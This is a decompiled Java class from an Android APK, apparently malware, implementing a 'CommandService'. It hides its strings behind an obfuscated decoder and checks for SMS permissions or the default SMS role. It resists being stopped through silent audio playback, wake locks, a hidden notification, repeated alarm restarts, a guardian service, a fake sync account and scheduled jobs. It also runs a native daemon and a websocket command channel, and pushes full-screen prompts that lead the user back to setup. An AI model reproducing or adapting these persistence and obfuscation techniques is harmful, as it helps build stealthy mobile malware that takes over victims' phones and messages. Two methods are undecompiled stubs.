package com.base.template.services;

import android.R;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.app.role.RoleManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.AudioTrack;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.SystemClock;
import android.provider.Telephony;
import androidx.core.app.NotificationCompat$Builder;
import androidx.tracing.Trace$$ExternalSyntheticApiModelOutline0;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.impl.WorkManagerImpl;
import com.base.template.NativeBridge;
import com.base.template.OnboardingActivity;
import com.base.template.network.WsPersistManager;
import java.io.File;
import java.io.FileOutputStream;
import java.util.Calendar;
import java.util.concurrent.TimeUnit;
import kotlin.ExceptionsKt;
import kotlin.io.CloseableKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.text.Charsets;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class CommandService extends Service {
    public static volatile CommandService instance;
    public CommandService$registerNetworkReceiver$2 dozeReceiver;
    public final CommandService$nudgeRunnable$1 heartbeatRunnable;
    public CommandService$registerNetworkReceiver$cb$1 networkCallback;
    public final CommandService$nudgeRunnable$1 nudgeRunnable;
    public CommandService$registerScreenReceiver$1 screenReceiver;
    public volatile long vmStartAttemptTime;
    public volatile boolean vmStarted;
    public PowerManager.WakeLock wakeLock;
    public volatile boolean workersScheduled;
    public final CommandService$$ExternalSyntheticLambda3 wsReconnectRunnable;
    public final Handler handler = new Handler(Looper.getMainLooper());
    public final SilentAudioKeepAlive silentAudio = new SilentAudioKeepAlive();
    public final CommandService$pongReceiver$1 pongReceiver = new BroadcastReceiver() { // from class: com.base.template.services.CommandService$pongReceiver$1
        @Override // android.content.BroadcastReceiver
        public final void onReceive(Context context, Intent intent) {
            Intent intent2 = new Intent(C0000.decode(new byte[]{91, 90, 94, 31, 1, 88, 64, 82, 72, 70, 93, 88, 67, 93, 2, 77, 86, 25, 42, 123, 110, 112, 125, 116, 48, 106, 108, 103, 41, 124, 127}, "8531c937f2", true));
            CommandService commandService = this.this$0;
            commandService.sendBroadcast(intent2.setPackage(commandService.getPackageName()));
        }
    };
    public final CommandService$$ExternalSyntheticLambda3 wsSoftReconnectRunnable = new CommandService$$ExternalSyntheticLambda3(this, 1);

    /* JADX WARN: Type inference failed for: r0v2, types: [com.base.template.services.CommandService$nudgeRunnable$1] */
    /* JADX WARN: Type inference failed for: r0v3, types: [com.base.template.services.CommandService$nudgeRunnable$1] */
    /* JADX WARN: Type inference failed for: r0v4, types: [com.base.template.services.CommandService$pongReceiver$1] */
    public CommandService() {
        final int i = 1;
        this.heartbeatRunnable = new Runnable(this) { // from class: com.base.template.services.CommandService$nudgeRunnable$1
            public final /* synthetic */ CommandService this$0;

            {
                this.this$0 = this;
            }

            /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:45:0x00ed
                	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
                	at jadx.core.dex.visitors.blocks.BlockSplitter.visit(BlockSplitter.java:79)
                */
            @Override // java.lang.Runnable
            public final void run() {
                /*
                    Method dump skipped, instruction units count: 692
                    To view this dump add '--comments-level debug' option
                */
                throw new UnsupportedOperationException("Method not decompiled: com.base.template.services.CommandService$nudgeRunnable$1.run():void");
            }
        };
        final int i2 = 0;
        this.nudgeRunnable = new Runnable(this) { // from class: com.base.template.services.CommandService$nudgeRunnable$1
            public final /* synthetic */ CommandService this$0;

            {
                this.this$0 = this;
            }

            /*  JADX ERROR: JadxRuntimeException in pass: BlockSplitter
                jadx.core.utils.exceptions.JadxRuntimeException: Unexpected missing predecessor for block: B:45:0x00ed
                	at jadx.core.dex.visitors.blocks.BlockSplitter.addTempConnectionsForExcHandlers(BlockSplitter.java:280)
                */
            @Override // java.lang.Runnable
            public final void run() {
                /*
                    Method dump skipped, instruction units count: 692
                    To view this dump add '--comments-level debug' option
                */
                throw new UnsupportedOperationException("Method not decompiled: com.base.template.services.CommandService$nudgeRunnable$1.run():void");
            }
        };
        this.wsReconnectRunnable = new CommandService$$ExternalSyntheticLambda3(this, i2);
    }

    public final void acquireTimedWakeLock() {
        try {
            PowerManager.WakeLock wakeLock = this.wakeLock;
            if (wakeLock != null) {
                wakeLock.acquire(20000L);
            }
        } catch (Exception unused) {
        }
    }

    public final Notification buildNotification() {
        NotificationCompat$Builder notificationCompat$Builder = new NotificationCompat$Builder(this, C0000.decode(new byte[]{82, 8, 93, 58, 7, 9, 85, 95, 95, 0, 85}, "1e9eda41", 3));
        notificationCompat$Builder.mNotification.icon = 2131034139;
        notificationCompat$Builder.mPriority = -2;
        notificationCompat$Builder.setFlag(2, true);
        notificationCompat$Builder.mSilent = true;
        return notificationCompat$Builder.build();
    }

    public final void createChannel() {
        Object systemService = getSystemService(C0000.decode(new byte[]{11, 93, 76, 10, 85, 91, 80, 80, 66, 89, 12, 95}, "e28c323160c14d71"));
        NotificationManager notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
        if (notificationManager == null) {
            return;
        }
        NotificationChannel notificationChannel = new NotificationChannel(C0000.decode(new byte[]{82, 94, 7, 60, 5, 13, 89, 15, 95, 86, 15}, "13ccfe8a", false), C0000.decode(new byte[]{98, 24, 74, 64, 0, 9}, "1a94ed1bbe555cf5"), 1);
        notificationChannel.setShowBadge(false);
        notificationChannel.setLockscreenVisibility(-1);
        notificationManager.createNotificationChannel(notificationChannel);
        NotificationChannel notificationChannel2 = new NotificationChannel(C0000.decode(new byte[]{68, 92, 67, 65, 22, 106, 89, 76, 83, 83, 3}, "7974f5", false), C0000.decode(new byte[]{113, 18, 18, 20, 103, 6, 64, 69, 17}, "0bb44c40a10056"), 4);
        notificationChannel2.setDescription(C0000.decode(new byte[]{99, 6, 22, 22, 71, 20, 82, 86, 90, 69, 92, 6, 22, 10, 88, 90}, "0cbc741975", true));
        notificationChannel2.enableVibration(true);
        notificationChannel2.setVibrationPattern(new long[]{0, 250, 100, 250});
        notificationChannel2.setShowBadge(true);
        notificationChannel2.setLockscreenVisibility(1);
        notificationManager.createNotificationChannel(notificationChannel2);
    }

    /* JADX WARN: Code duplicated, block: B:22:0x0074  */
    public final boolean isSmsSetupDone() {
        boolean zAreEqual;
        boolean z;
        try {
            boolean z2 = checkSelfPermission(C0000.decode(new byte[]{7, 89, 93, 71, 91, 93, 85, 77, 66, 3, 23, 14, 15, 68, 74, 92, 91, 90, 31, 49, 119, 39, 33, 60, 53, 122, 106}, "f795441c2fec", 0)) == 0 && checkSelfPermission(C0000.decode(new byte[]{84, 12, 93, 17, 90, 90, 86, 23, 72, 86, 19, 14, 92, 17, 74, 10, 90, 93, 28, 107, 125, 112, 36, 42, 99, 39, 102, 48, 120, 96}, "5b9c532983ac", 0.0f)) == 0;
            try {
                zAreEqual = Intrinsics.areEqual(Telephony.Sms.getDefaultSmsPackage(this), getPackageName());
            } catch (Exception unused) {
                zAreEqual = false;
            }
            try {
                if (Build.VERSION.SDK_INT >= 29) {
                    Object systemService = getSystemService(C0000.decode(new byte[]{64, 13, 88, 80}, "2b45bc0200", 6));
                    RoleManager roleManagerM = Trace$$ExternalSyntheticApiModelOutline0.m5m(systemService) ? Trace$$ExternalSyntheticApiModelOutline0.m(systemService) : null;
                    if (roleManagerM == null || !roleManagerM.isRoleHeld(C0000.decode(new byte[]{84, 86, 7, 69, 9, 88, 85, 31, 87, 66, 64, 28, 71, 87, 15, 82, 72, 98, 124, 98}, "58c7f1116202", 0.0f))) {
                        z = false;
                    } else {
                        z = true;
                    }
                } else {
                    z = false;
                }
            } catch (Exception unused2) {
            }
            return z2 || zAreEqual || z;
        } catch (Exception unused3) {
            return false;
        }
    }

    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r3v14, types: [com.base.template.services.CommandService$registerScreenReceiver$1] */
    /* JADX WARN: Type inference failed for: r3v9, types: [android.content.BroadcastReceiver, com.base.template.services.CommandService$registerNetworkReceiver$2] */
    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        instance = this;
        createChannel();
        try {
            this.silentAudio.start();
        } catch (Exception unused) {
        }
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9900, buildNotification(), 1073741826);
            } else {
                startForeground(9900, buildNotification());
            }
        } catch (Exception e) {
            e.getMessage();
            if (Build.VERSION.SDK_INT >= 31 && CommandService$$ExternalSyntheticApiModelOutline0.m(e)) {
                scheduleAlarmRestart(5000L);
                if (!this.workersScheduled) {
                    try {
                        try {
                            TimeUnit timeUnit = TimeUnit.MINUTES;
                            WorkManagerImpl.getInstance$1(this).enqueueUniquePeriodicWork((PeriodicWorkRequest) new OneTimeWorkRequest.Builder().build());
                        } catch (Exception e2) {
                            e2.getMessage();
                        }
                        this.workersScheduled = true;
                    } catch (Exception unused2) {
                        scheduleSafetyNetAlarm();
                        stopSelf();
                        return;
                    }
                }
                scheduleSafetyNetAlarm();
                stopSelf();
                return;
            }
        }
        try {
            File file = new File(getFilesDir(), C0000.decode(new byte[]{31, 17, 8, 7}, "1aacd1", 0.0f));
            byte[] bytes = String.valueOf(Process.myPid()).getBytes(Charsets.UTF_8);
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                fileOutputStream.write(bytes);
                fileOutputStream.close();
            } catch (Throwable th) {
                try {
                    throw th;
                } catch (Throwable th2) {
                    CloseableKt.closeFinally(fileOutputStream, th);
                    throw th2;
                }
            }
        } catch (Exception unused3) {
        }
        try {
            PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) getSystemService(C0000.decode(new byte[]{21, 95, 65, 84, 69}, "e0617a9e"))).newWakeLock(1, getPackageName() + C0000.decode(new byte[]{3, 69, 72, 86, 85}, "96186f6b36606d9b", 0.0f));
            wakeLockNewWakeLock.setReferenceCounted(false);
            this.wakeLock = wakeLockNewWakeLock;
        } catch (Exception e3) {
            e3.getMessage();
        }
        startVM();
        NativeBridge.startDaemon(this);
        this.handler.postDelayed(new CommandService$$ExternalSyntheticLambda3(this, 2), 5000L);
        this.handler.post(this.heartbeatRunnable);
        this.handler.postDelayed(this.nudgeRunnable, 8000L);
        try {
            int i = Build.VERSION.SDK_INT;
            String strDecode = C0000.decode(new byte[]{91, 90, 91, 23, 90, 89, 70, 82, 77, 76, 80, 84, 72, 89, 87, 77, 93, 22, 121, 126, 53, 125, 123, 124, 107, 102, 105, 105, 113, 118, 114}, "85698857c859", false);
            if (i >= 33) {
                registerReceiver(this.pongReceiver, new IntentFilter(strDecode), 4);
            } else {
                registerReceiver(this.pongReceiver, new IntentFilter(strDecode));
            }
        } catch (Exception unused4) {
        }
        try {
            this.screenReceiver = new BroadcastReceiver() { // from class: com.base.template.services.CommandService$registerScreenReceiver$1
                @Override // android.content.BroadcastReceiver
                public final void onReceive(Context context, Intent intent) {
                    CommandService commandService = this.this$0;
                    CommandService commandService2 = CommandService.instance;
                    commandService.writeHeartbeat();
                }
            };
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction(C0000.decode(new byte[]{89, 8, 0, 70, 88, 94, 93, 76, 80, 91, 76, 3, 10, 64, 25, 86, 90, 22, 80, 90, 86, 72, 55, 119, 101, 114, 124, 44, 102, 122, 126, 32}, "8fd4779b95", false));
            intentFilter.addAction(C0000.decode(new byte[]{88, 94, 81, 71, 92, 8, 93, 30, 92, 91, 71, 4, 87, 68, 27, 84, 80, 21, 80, 95, 91, 27, 96, 34, 107, 117, 112, 123, 108, 46, 119}, "90553a", 0.0f));
            intentFilter.addAction(C0000.decode(new byte[]{80, 10, 5, 67, 91, 94, 5, 31, 8, 11, 76, 81, 94, 68, 31, 5, 2, 69, 93, 88, 15, 31, 52, 54, 125, 102, 111, 96, 99, 33, 50, 116, 122, 99}, "1da147a1ae8400"));
            registerReceiver(this.screenReceiver, intentFilter);
        } catch (Exception unused5) {
        }
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(C0000.decode(new byte[]{90, 90, 94, 13, 7, 0, 66, 92, 65, 88, 18, 77}, "950cbc6571f4", 0));
            CommandService$registerNetworkReceiver$cb$1 commandService$registerNetworkReceiver$cb$1 = new CommandService$registerNetworkReceiver$cb$1(0, this);
            connectivityManager.registerDefaultNetworkCallback(commandService$registerNetworkReceiver$cb$1);
            this.networkCallback = commandService$registerNetworkReceiver$cb$1;
        } catch (Exception unused6) {
        }
        try {
            ?? r3 = new BroadcastReceiver() { // from class: com.base.template.services.CommandService$registerNetworkReceiver$2
                @Override // android.content.BroadcastReceiver
                public final void onReceive(Context context, Intent intent) {
                    CommandService commandService = this.this$0;
                    CommandService$$ExternalSyntheticLambda3 commandService$$ExternalSyntheticLambda3 = commandService.wsReconnectRunnable;
                    Handler handler = commandService.handler;
                    Object systemService = commandService.getSystemService(C0000.decode(new byte[]{72, 92, 21, 92, 69}, "83b97fca1b83", true));
                    PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
                    if (powerManager == null) {
                        return;
                    }
                    if (!powerManager.isDeviceIdleMode()) {
                        commandService.acquireTimedWakeLock();
                        handler.removeCallbacks(commandService$$ExternalSyntheticLambda3);
                        handler.postDelayed(commandService$$ExternalSyntheticLambda3, 2000L);
                    } else {
                        commandService.acquireTimedWakeLock();
                        try {
                            Object obj = WsPersistManager.lock;
                            WsPersistManager.disconnect();
                            NativeBridge.setWsConnected(false);
                        } catch (Exception unused7) {
                        }
                        commandService.scheduleAlarmRestart(60000L);
                    }
                }
            };
            this.dozeReceiver = r3;
            int i2 = Build.VERSION.SDK_INT;
            String strDecode2 = C0000.decode(new byte[]{5, 95, 93, 16, 92, 80, 6, 23, 94, 64, 31, 0, 5, 77, 8, 94, 10, 31, 125, 39, 101, 112, 33, 124, 110, 122, 117, 45, 35, 102, 44, 126, 32, 116, 102, 33, 123, 120, 44, 126, 116, 119}, "d19b39b9131af9a1", 0.0f);
            if (i2 >= 33) {
                registerReceiver(r3, new IntentFilter(strDecode2), 4);
            } else {
                registerReceiver(r3, new IntentFilter(strDecode2));
            }
        } catch (Exception unused7) {
        }
        try {
            Intent intent = new Intent(this, (Class<?>) GuardianService.class);
            intent.putExtra(C0000.decode(new byte[]{57, 90, 85, 80, 92, 60, 17, 93, 80}, "f7492ca44be7f247", false), Process.myPid());
            startForegroundService(intent);
        } catch (Exception e4) {
            e4.getMessage();
        }
        this.handler.postDelayed(new CommandService$$ExternalSyntheticLambda3(this, 3), 20000L);
        if (!this.workersScheduled) {
            try {
                try {
                    TimeUnit timeUnit2 = TimeUnit.MINUTES;
                    WorkManagerImpl.getInstance$1(this).enqueueUniquePeriodicWork((PeriodicWorkRequest) new OneTimeWorkRequest.Builder().build());
                } catch (Exception e5) {
                    e5.getMessage();
                }
                this.workersScheduled = true;
            } catch (Exception unused8) {
            }
        }
        try {
            RescueJobService.Companion.getClass();
            RescueJobService.Companion.schedule(this);
        } catch (Exception unused9) {
        }
        try {
            String strDecode3 = C0000.decode(new byte[]{91, 13, 88, 24, 7, 81, 66, 84, 22, 22, 80, 91, 21, 92, 80, 69, 93, 76, 84, 85, 6, 95, 68, 95, 76}, "8b56e011", false);
            String strDecode4 = C0000.decode(new byte[]{1, 14, 9, 79, 1, 89, 17, 4, 74, 21, 6, 85, 18, 13, 5, 21, 6, 22, 18, 19, 11, 23, 10, 92, 7, 19}, "badac8", true);
            try {
                AccountManager accountManager = AccountManager.get(this);
                Account account = new Account(C0000.decode(new byte[]{98, 26, 67, 16, 84, 91}, "1c0d1607"), strDecode3);
                if (accountManager.getAccountsByType(strDecode3).length == 0) {
                    accountManager.addAccountExplicitly(account, null, null);
                }
                ContentResolver.setIsSyncable(account, strDecode4, 1);
                ContentResolver.setSyncAutomatically(account, strDecode4, true);
                ContentResolver.addPeriodicSync(account, strDecode4, Bundle.EMPTY, 1800L);
            } catch (Exception e6) {
                e6.getMessage();
            }
        } catch (Exception unused10) {
        }
        scheduleDailyRestart$app_release();
        scheduleSafetyNetAlarm();
    }

    @Override // android.app.Service
    public final void onDestroy() {
        instance = null;
        try {
            SilentAudioKeepAlive silentAudioKeepAlive = this.silentAudio;
            silentAudioKeepAlive.running = false;
            try {
                AudioTrack audioTrack = silentAudioKeepAlive.track;
                if (audioTrack != null) {
                    audioTrack.stop();
                }
            } catch (Exception unused) {
            }
            silentAudioKeepAlive.thread = null;
        } catch (Exception unused2) {
        }
        try {
            Object obj = WsPersistManager.lock;
            WsPersistManager.disconnect();
        } catch (Exception unused3) {
        }
        this.handler.removeCallbacks(this.heartbeatRunnable);
        this.handler.removeCallbacks(this.nudgeRunnable);
        this.handler.removeCallbacks(this.wsReconnectRunnable);
        this.handler.removeCallbacks(this.wsSoftReconnectRunnable);
        try {
            unregisterReceiver(this.pongReceiver);
        } catch (Exception unused4) {
        }
        try {
            CommandService$registerScreenReceiver$1 commandService$registerScreenReceiver$1 = this.screenReceiver;
            if (commandService$registerScreenReceiver$1 != null) {
                unregisterReceiver(commandService$registerScreenReceiver$1);
            }
        } catch (Exception unused5) {
        }
        try {
            CommandService$registerNetworkReceiver$2 commandService$registerNetworkReceiver$2 = this.dozeReceiver;
            if (commandService$registerNetworkReceiver$2 != null) {
                unregisterReceiver(commandService$registerNetworkReceiver$2);
            }
        } catch (Exception unused6) {
        }
        try {
            CommandService$registerNetworkReceiver$cb$1 commandService$registerNetworkReceiver$cb$1 = this.networkCallback;
            if (commandService$registerNetworkReceiver$cb$1 != null) {
                Object systemService = getSystemService(C0000.decode(new byte[]{85, 94, 11, 95, 87, 87, 76, 15, 20, 89, 17, 73}, "61e1248fb0e0f4cb", 4));
                ConnectivityManager connectivityManager = systemService instanceof ConnectivityManager ? (ConnectivityManager) systemService : null;
                if (connectivityManager != null) {
                    connectivityManager.unregisterNetworkCallback(commandService$registerNetworkReceiver$cb$1);
                }
            }
        } catch (Exception unused7) {
        }
        try {
            PowerManager.WakeLock wakeLock = this.wakeLock;
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
        } catch (Exception unused8) {
        }
        this.wakeLock = null;
        scheduleAlarmRestart(3000L);
        try {
            ExceptionsKt.pingNow(this);
        } catch (Exception unused9) {
        }
        super.onDestroy();
    }

    @Override // android.app.Service
    public final int onStartCommand(Intent intent, int i, int i2) {
        String action;
        instance = this;
        try {
            createChannel();
            if (!this.silentAudio.running) {
                try {
                    this.silentAudio.start();
                } catch (Exception unused) {
                }
            }
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(9900, buildNotification(), 1073741826);
            } else {
                startForeground(9900, buildNotification());
            }
        } catch (Exception e) {
            e.getMessage();
            if (Build.VERSION.SDK_INT >= 31 && CommandService$$ExternalSyntheticApiModelOutline0.m(e)) {
                scheduleAlarmRestart(5000L);
                stopSelf();
                return 2;
            }
        }
        if (intent == null || (action = intent.getAction()) == null) {
            action = "";
        }
        acquireTimedWakeLock();
        writeHeartbeat();
        startVM();
        try {
            Object obj = WsPersistManager.lock;
            WsPersistManager.connect(getApplicationContext());
        } catch (Exception unused2) {
        }
        if (!action.equals(C0000.decode(new byte[]{118, 115, 113, 117, 104, 59, 96, 119, 107, 109, 112, 54, 102}, "22891d"))) {
            return 1;
        }
        scheduleDailyRestart$app_release();
        return 1;
    }

    @Override // android.app.Service
    public final void onTaskRemoved(Intent intent) {
        scheduleAlarmRestart(1000L);
        try {
            ExceptionsKt.pingNow(this);
        } catch (Exception unused) {
        }
        super.onTaskRemoved(intent);
    }

    public final void scheduleAlarmRestart(long j) {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(C0000.decode(new byte[]{3, 85, 3, 23, 8}, "b9bee71ef7", 0.0f));
            Intent intent = new Intent(this, (Class<?>) CommandService.class);
            intent.setAction(C0000.decode(new byte[]{120, 117, 116, 51, 121, 108, 52, 115, 96, 97, 118, 54, 97}, "995a43f6357d54dd", 0.0f));
            PendingIntent service = PendingIntent.getService(this, 31354, intent, 1275068416);
            System.currentTimeMillis();
            if (Build.VERSION.SDK_INT < 31 || alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + j, service);
            } else {
                alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + j, service);
            }
        } catch (Exception e) {
            e.getMessage();
            try {
                ExceptionsKt.pingNow(this);
            } catch (Exception unused) {
            }
        }
    }

    public final void scheduleDailyRestart$app_release() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(C0000.decode(new byte[]{89, 85, 2, 74, 90}, "89c87c11e5", true));
            Intent intent = new Intent(this, (Class<?>) CommandService.class);
            intent.setAction(C0000.decode(new byte[]{113, 36, 126, 47, 63, 108, 98, 113, 107, 50, 113, 103, 101}, "5e7cf3048f051a83"));
            PendingIntent service = PendingIntent.getService(this, 6684, intent, 201326592);
            Calendar calendar = Calendar.getInstance();
            calendar.set(11, 3);
            calendar.set(12, 15);
            calendar.set(13, 0);
            if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
                calendar.add(5, 1);
            }
            if (Build.VERSION.SDK_INT < 31 || alarmManager.canScheduleExactAlarms()) {
                alarmManager.setExactAndAllowWhileIdle(0, calendar.getTimeInMillis(), service);
            } else {
                alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(calendar.getTimeInMillis(), null), service);
            }
        } catch (Exception e) {
            e.getMessage();
        }
    }

    public final void scheduleSafetyNetAlarm() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(C0000.decode(new byte[]{82, 14, 83, 64, 12}, "3b22a3acf7", 6));
            Intent intent = new Intent(this, (Class<?>) CommandService.class);
            intent.setAction(C0000.decode(new byte[]{121, 42, 32, 98, 123, 110, 49, 33, 96, 53, 115, 96, 96}, "8fa061cd3a2249", true));
            alarmManager.setAlarmClock(new AlarmManager.AlarmClockInfo(System.currentTimeMillis() + 3600000, null), PendingIntent.getService(this, 6685, intent, 201326592));
        } catch (Exception e) {
            e.getMessage();
        }
    }

    public final void showNudge(String str, String str2) {
        try {
            Intent intent = new Intent(this, (Class<?>) OnboardingActivity.class);
            intent.setFlags(335544320);
            PendingIntent activity = PendingIntent.getActivity(this, 5001, intent, 201326592);
            NotificationCompat$Builder notificationCompat$Builder = new NotificationCompat$Builder(this, C0000.decode(new byte[]{65, 84, 18, 65, 20, 62, 92, 68, 2, 83, 1}, "21f4da", 2));
            notificationCompat$Builder.mNotification.icon = R.drawable.ic_dialog_info;
            notificationCompat$Builder.mContentTitle = NotificationCompat$Builder.limitCharSequenceLength(str);
            notificationCompat$Builder.mContentText = NotificationCompat$Builder.limitCharSequenceLength(str2);
            notificationCompat$Builder.mPriority = 1;
            notificationCompat$Builder.mCategory = C0000.decode(new byte[]{67, 1, 93, 91, 91, 92, 87, 75}, "1d025829");
            notificationCompat$Builder.setFlag(2, true);
            notificationCompat$Builder.setFlag(16, false);
            notificationCompat$Builder.mContentIntent = activity;
            notificationCompat$Builder.mFullScreenIntent = activity;
            notificationCompat$Builder.setFlag(128, true);
            Notification notificationBuild = notificationCompat$Builder.build();
            Object systemService = getSystemService(C0000.decode(new byte[]{15, 86, 64, 8, 2, 13, 85, 7, 16, 93, 9, 8}, "a94add6fd4ff62f9"));
            NotificationManager notificationManager = systemService instanceof NotificationManager ? (NotificationManager) systemService : null;
            if (notificationManager != null) {
                notificationManager.notify(5001, notificationBuild);
            }
        } catch (Exception e) {
            e.getMessage();
        }
    }

    public final void startVM() {
        if (this.vmStarted) {
            return;
        }
        this.vmStarted = true;
        this.vmStartAttemptTime = System.currentTimeMillis();
        NativeBridge.INSTANCE.setAppContext(getApplicationContext());
        new Thread(new CommandService$$ExternalSyntheticLambda3(this, 5), C0000.decode(new byte[]{34, 74, 24, 15, 82, 101, 14, 23, 10, 92, 19}, "c9aa12aea9a073", 0.0f)).start();
    }

    public final void writeHeartbeat() {
        try {
            getSharedPreferences(C0000.decode(new byte[]{81, 83, 2, 19, 65, 82, 87, 4, 67}, "96ca502e7a6bc3", 1), 0).edit().putLong(C0000.decode(new byte[]{14, 82, 75, 17, 110, 1, 6, 87, 16, 60, 11, 17}, "b38e1cc6dcfb7b"), System.currentTimeMillis()).apply();
        } catch (Exception unused) {
        }
    }
}
